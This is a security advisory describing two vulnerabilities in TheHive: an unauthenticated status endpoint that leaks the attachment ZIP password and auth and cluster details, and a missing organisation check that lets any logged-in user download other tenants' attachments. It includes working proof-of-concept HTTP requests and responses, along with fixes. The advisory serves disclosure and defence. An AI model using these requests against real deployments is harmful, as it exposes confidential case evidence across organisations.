https://github.com/TheHive-Project/TheHive - "This repository was archived by the owner on Dec 6, 2025. It is now read-only."

## Finding 1: GET /api/status exposes attachment protection password without authentication

Package: TheHive-Project/TheHive

Affected Versions: Confirmed on commit d390a03 (HEAD as of 2026-05-25) and strangebee/thehive:5.4 (5.4.11-1)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)

CWE: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

### Summary
`GET /api/status` in TheHive returns the runtime attachment protection password (`datastore.attachment.password`) in plaintext without requiring authentication. Any caller with network access to the TheHive port can retrieve the configured ZIP password used to protect malware attachment downloads. The endpoint also discloses the configured authentication providers, SSO settings, MFA capabilities, and (in clustered deployments) member node addresses and roles.

### Details

File: `thehive/app/org/thp/thehive/controllers/v1/StatusCtrl.scala`

The `get` action uses the ScalliGraph `entrypoint("status") { _ => ... }` pattern without a `.auth`, `.authTransaction`, or `.authRoTransaction` call. All protected endpoints in the codebase use one of these auth-chained variants; the absence here means the request bypasses authentication entirely.

```scala
def get: Action[AnyContent] =
  entrypoint("status") { _ =>
    Success(
      Results.Ok(
        Json.obj(
          ...
          "config" -> Json.obj(
            "protectDownloadsWith" -> password,   // reads datastore.attachment.password
            "authType" -> ...,
            "capabilities" -> ...,
            "ssoAutoLogin" -> ...,
          ),
          "cluster" -> cluster.state,             // includes member addresses and roles
          ...
        )
      )
    )
  }
```

The `password` value is read from `datastore.attachment.password` (default: `"malware"` in `thehive/conf/reference.conf`). When operators configure a non-default password (as recommended for environments handling sensitive attachments), that custom password is returned by this unauthenticated endpoint.

The router at `thehive/app/org/thp/thehive/controllers/v1/Router.scala` registers the route:

```scala
case GET(p"/status") => statusCtrl.get
```

No authentication middleware wraps this registration; the route is reachable without any session, API key, or Basic auth header.

### PoC

Tested against `strangebee/thehive:5.4` (5.4.11-1) with default configuration. No credentials supplied.

```
GET /api/status HTTP/1.1
Host: localhost:9000
->
HTTP/1.1 200 OK
Content-Type: application/json

{
  "versions": {
    "Scalligraph": "5.4.11-1",
    "TheHive": "5.4.11-1",
    "Play": "3.0.x"
  },
  "config": {
    "protectDownloadsWith": "malware",
    "authType": ["key", "session", "basic", "local"],
    "capabilities": ["authByKey", "changePassword", "setPassword", "mfa"],
    "ssoAutoLogin": false
  }
}
```

Control: a request to a protected endpoint with no credentials returns 401:

```
GET /api/case HTTP/1.1
Host: localhost:9000
->
HTTP/1.1 401 Unauthorized
```

A request with invalid credentials to /api/status still returns 200 (the endpoint does not check them):

```
GET /api/status HTTP/1.1
Authorization: Basic d3Jvbmc6d3Jvbmc=
->
HTTP/1.1 200 OK
... "protectDownloadsWith": "malware" ...
```

### Impact

1. **Attachment password disclosure**: TheHive is a security incident response platform used to handle malware samples and sensitive evidence. Attachments are ZIP-compressed with the configured password. Any unauthenticated caller can retrieve this password and use it to open attachment ZIPs obtained through other means (e.g., network capture, storage access, misconfigured S3 buckets). Operators who set a non-default password to limit accidental access to archives have that password immediately undone.

2. **Authentication surface enumeration**: The `authType` array lists every configured authentication provider (`local`, `ldap`, `saml`, etc.) and the `capabilities` list indicates whether API key authentication, MFA, or SSO is enabled. This information is useful for targeting credential-stuffing or provider-specific attacks.

3. **Cluster topology disclosure (multi-node)**: In clustered TheHive deployments, `cluster.state` includes member addresses, ports, statuses, and roles for every node in the Akka cluster. This reveals internal network topology to unauthenticated callers.

Suggested fix: add `.auth` to the `get` action chain so that the endpoint requires a valid session or API key. If a reduced public status endpoint is needed for load-balancer health checks, it should return only an HTTP 200 with no sensitive fields. The attachment password field in particular should never be included in any client-facing response.


## Finding 2: Cross-Organisation Attachment Disclosure via Unauthorized Datastore Endpoint (Missing Object-Level Authorization)

Package: TheHive-Project/TheHive

Affected Versions: 4.1.24 and earlier 4.x releases (AttachmentSrv.visible has been an unimplemented `// TODO` since at least this code path's introduction in the 4.x series; not fixed at the final 4.1.24 release)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

CWE: CWE-639 (Authorization Bypass Through User-Controlled Key)

### Summary
TheHive 4's attachment download endpoints (`GET /api/v0/datastore/{id}` and `GET /api/v0/datastorezip/{id}`) perform no organisation- or case-scoped authorization check. Any authenticated user in any organisation can download the binary content of any attachment in the platform — including case evidence, observables, and forensic files belonging to completely unrelated organisations/tenants — simply by knowing or guessing the attachment's content-hash identifier, which is routinely exposed in normal case/observable API responses to the file's legitimate owners.

### Details
`AttachmentSrv.visible` (`thehive/app/org/thp/thehive/services/AttachmentSrv.scala:101`) is defined as a literal pass-through traversal with an unaddressed `// TODO` comment:

```scala
def visible: Traversal.V[Attachment] = traversal // TODO
```

Every other core resource type in TheHive (Case, Task, Observable, Alert, Log, Audit) implements `.visible` as a graph-traversal filter that restricts results to entities reachable from the caller's current organisation. `Attachment` never received this filter.

`AttachmentCtrl.download` and `AttachmentCtrl.downloadZip` (`thehive/app/org/thp/thehive/controllers/v0/AttachmentCtrl.scala:35-104`) rely entirely on this `.visible` call as their only object-level access check:

```scala
def download(id: String, name: Option[String]): Action[AnyContent] =
  entrypoint("download attachment")
    .authRoTransaction(db) { implicit authContext => implicit graph =>
      ...
      attachmentSrv.get(EntityIdOrName(id)).visible.getOrFail("Attachment")
        .filter(attachmentSrv.exists)
        .map { attachment => /* stream file bytes */ }
```

`entrypoint(...).authRoTransaction(db)` only verifies that the request carries a valid authenticated session (`ScalliGraph/core/src/main/scala/org/thp/scalligraph/controllers/Entrypoint.scala:142-144`); it performs no permission or ownership check, unlike the codebase's own `authPermittedRoTransaction` helper used for permission-gated actions elsewhere. Because `.visible` is a no-op, the combined effect is that any authenticated user, regardless of organisation, can fetch any attachment by id.

The routes are registered with no case/organisation scoping in the path (`thehive/app/org/thp/thehive/controllers/v0/Router.scala:69-70`):
```
case GET(p"/datastore/$id" ? q_o"name=$name")    => attachmentCtrl.download(id, name)
case GET(p"/datastorezip/$id" ? q_o"name=$name") => attachmentCtrl.downloadZip(id, name)
```
No v1 equivalent exists (`thehive/app/org/thp/thehive/controllers/v1/Router.scala:14` has `attachmentCtrl` commented out), so these v0 routes are the complete and only attack surface for this resource class.

Attachment ids are SHA-based content hashes assigned at upload time (`AttachmentSrv.create`, `thehive/app/org/thp/thehive/services/AttachmentSrv.scala:32-58`), not per-organisation random identifiers. They are returned directly in normal, legitimate API responses (case/observable creation and listing, case export, connector sync payloads) to members of the owning organisation, making them a routinely obtainable value rather than a theoretical secret.

### PoC
Using two independently created organisations and users (created via the admin `/api/v1/organisation` and `/api/v1/user` API, with password-based logins):

```
# Victim creates a case and uploads a confidential file observable
POST /api/v1/case {"title":"Confidential Incident - VictimOrg only", ...}
  -> 201, case _id "~24592"

POST /api/v1/case/~24592/observable  (multipart, attachment=secret_evidence.txt)
  -> 201, response includes:
     "attachment":{"name":"secret_evidence.txt",
                   "id":"9fbc7c303a38ffceb62398b451cd08efe02a037edc802e29f655523d201abb13", ...}

# Attacker (different organisation, no share, no case access) confirms no normal access:
GET /api/v1/case/~24592   (attacker session)
  -> 404 {"type":"NotFoundError","message":"Case not found"}

# Attacker downloads the victim's file directly via the unauthorized datastore endpoint:
GET /api/v0/datastore/9fbc7c303a38ffceb62398b451cd08efe02a037edc802e29f655523d201abb13?name=stolen.txt
  (attacker session)
  -> 200 OK
     Content-Disposition: attachment; filename="stolen.txt"
     Body: "TOP-SECRET-BREACH-EVIDENCE: customer database dump, victimorg confidential,
            attacker should never see this"

# Zip variant equally exploitable:
GET /api/v0/datastorezip/9fbc7c303a38ffceb62398b451cd08efe02a037edc802e29f655523d201abb13?name=stolen
  (attacker session)
  -> 200 OK, Content-Type: application/zip, valid zip containing the same file
```

### Impact
Any authenticated user of a TheHive 4 instance — regardless of which organisation they belong to or what role/profile they hold — can read the full binary content of any attachment stored on the platform, including confidential case evidence, malware samples, screenshots, and forensic artifacts belonging to organisations they have no relationship with and no visibility into via any other endpoint. On a multi-tenant TheHive deployment (the platform's core use case for MSSPs/shared SOC instances), this is a complete cross-tenant confidentiality breach of all stored case attachments.
